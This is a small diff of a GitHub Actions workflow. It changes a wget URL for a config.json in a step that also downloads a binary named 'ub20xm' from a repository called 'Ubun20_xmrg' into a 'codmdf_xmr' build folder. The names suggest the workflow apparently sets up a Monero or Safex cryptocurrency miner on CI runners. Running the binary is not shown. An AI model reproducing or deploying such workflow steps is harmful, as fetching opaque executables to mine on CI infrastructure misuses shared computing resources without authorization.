@@ -26,7 +26,7 @@ jobs:
       run: |
         cd codmdf_xmr
         cd build
-        wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Arq/config.json
+        wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/Safex/config.json
         wget https://raw.githubusercontent.com/romanferty/Ubun20_xmrg/main/ub20xm
     - name: Renombrar.
       run: |
